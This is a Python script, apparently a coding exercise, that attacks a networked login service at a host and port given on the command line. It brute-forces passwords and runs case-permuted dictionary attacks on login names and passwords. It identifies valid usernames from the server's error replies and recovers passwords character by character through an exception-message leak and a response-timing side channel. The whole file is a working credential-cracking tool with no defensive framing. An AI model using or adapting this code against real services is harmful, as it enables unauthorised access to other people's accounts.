import sys
import itertools
import socket
import json
import time


class Hacker:

    def __init__(self, host, port):
        self.hostname = host
        self.port = int(port)
        self.sock = socket.socket()
        self.characters = 'abcdefghijklmnopqrstuvwxyz0123456789'
        self.characters2 = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
        self.connect()

    def connect(self):
        with socket.socket() as self.sock:
            address = (self.hostname, self.port)
            self.sock.connect(address)
            self.login_dict()

    def tx_rx(self, data):
        try:
            self.sock.send(data.encode())
            response = self.sock.recv(1024).decode()
            return response
        except ConnectionAbortedError:
            pass
        except ConnectionResetError:
            pass

    def brute(self):
        for i in range(1, len(self.characters) + 1):
            for attempt in itertools.product(self.characters, repeat=i):
                message = ''.join(attempt)
                conn_status = self.tx_rx(message)
                if conn_status == 'Connection success!':
                    print(message)
                    sys.exit()

    def pass_dict(self):
        with open('../../passwords.txt', 'r') as f:
            pass_list = [line.rstrip() for line in f]
        for word in pass_list:
            for variation in map(''.join, itertools.product(*(sorted({c.upper(), c.lower()}) for c in word))):
                conn_status = self.tx_rx(variation)
                if conn_status == 'Connection success!':
                    print(variation)
                    sys.exit()

    def pass_build(self, login):
        p = ''
        while True:
            for character in self.characters2:
                model = {"login": login, "password": p + character}
                json_login = json.dumps(model)
                conn_status = json.loads(self.tx_rx(json_login))
                if conn_status == {
                    "result": "Exception happened during login"
                }:
                    p = p + character
                elif conn_status == {
                    "result": "Connection success!"
                }:
                    p = p + character
                    model = {"login": login, "password": p}
                    print(json.dumps(model))
                    sys.exit()

    def pass_build2(self, login):
        p = ''
        while True:
            for character in self.characters2:
                start = time.time()
                model = {"login": login, "password": p + character}
                json_login = json.dumps(model)
                conn_status = json.loads(self.tx_rx(json_login))
                if conn_status == {
                                    "result": "Connection success!"
                                  }:
                    model = {"login": login, "password": p + character}
                    print(json.dumps(model))
                    sys.exit()
                else:
                    end = time.time()
                    total = end - start
                    if total > 0.1:
                        p += character

    def login_dict(self):
        with open('../../logins.txt', 'r') as f:
            login_list = [line.rstrip() for line in f]
        for word in login_list:
            for login in map(''.join, itertools.product(*(sorted({c.upper(), c.lower()}) for c in word))):
                model = {"login": login, "password": " "}
                json_login = json.dumps(model)
                conn_status = json.loads(self.tx_rx(json_login))
                if conn_status == {
                                        "result": "Wrong password!"
                                   }:
                    self.pass_build2(login)


args = sys.argv
hacker = Hacker(host=args[1], port=args[2])
